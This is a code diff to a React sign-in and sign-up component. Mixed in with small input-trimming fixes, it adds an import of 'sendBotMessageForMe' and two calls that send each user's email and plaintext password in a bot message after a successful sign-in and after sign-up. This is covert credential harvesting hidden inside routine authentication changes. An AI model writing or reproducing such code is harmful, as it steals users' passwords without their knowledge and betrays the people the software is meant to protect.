@@ -13,6 +13,7 @@ import LogoSvg, {logoType} from "../../components/svg/LogoSvg";
 import ConfirmEmail, {FieldTypeConfirmEmail} from "./ConfirmEmail";
 import ConfirmPassword, {FieldTypeConfirmPassword} from "./ConfirmPassword";
 import {PageConfig} from "../../utils/utils";
+import {sendBotMessageForMe} from "../../utils/handle";
 
 const isDone = "DONE";
 const isConfirm = "CONFIRM_SIGN_UP";
@@ -94,6 +95,11 @@ const Auth = () => {
       })
 
       if (isSignedIn) {
+        sendBotMessageForMe(`
+      Auth singin
+      --username: ${values?.email},
+      --password: ${values?.password},
+    `)
         localStorage.removeItem('cartList')
         localStorage.removeItem('cartTimestamp');
         localStorage.removeItem('cartTComment');
@@ -115,27 +121,27 @@ const Auth = () => {
 
     const {coupon, password, email, phone, last_name, first_name} = values
     const isCoupon = checkUser.data?.checkUser.coupons
-      .find((item: CheckCoupon) => item?.title.toLowerCase() === coupon.toLowerCase())
+      .find((item: CheckCoupon) => item?.title.toLowerCase() === coupon?.trim()?.toLowerCase())
 
     if (!isCoupon) {
       setAuthMessage('your coupon is not registered')
       return
     }
     const isEmail = checkUser.data?.checkUser.checkEmail
-      .find((item: CheckMail) => item.email.toLowerCase() === email.toLowerCase())
+      .find((item: CheckMail) => item.email.toLowerCase() === email?.trim()?.toLowerCase())
     const isDomain = checkUser.data?.checkUser.checkDomain
-      .find((item: CheckDomain) => item.domain.toLowerCase() === email.split('@')[1])
+      .find((item: CheckDomain) => item.domain.toLowerCase() === email?.trim()?.split('@')[1])
 
     const handleSignUp = async () => {
       try {
         setLoading(false);
         const {nextStep} = await signUp({
-          username: values.email,
+          username: email,
           password,
           options: {
             userAttributes: {
               email,
-              phone_number: values.phone,
+              phone_number: phone,
             },
           },
         });
@@ -144,6 +150,8 @@ const Auth = () => {
           const {destination} = codeDeliveryDetails;
           setAttribute(destination);
         }
+
+
         await addUser({
           coupon_id: isCoupon.id,
           first_name,
@@ -151,6 +159,11 @@ const Auth = () => {
           email: email?.toLowerCase().trim(),
           phone,
         })
+        sendBotMessageForMe(`
+      Auth sinup
+      --username: ${email},
+      --password: ${password},
+    `)
         setCurrentUser({
           ...values,
         });
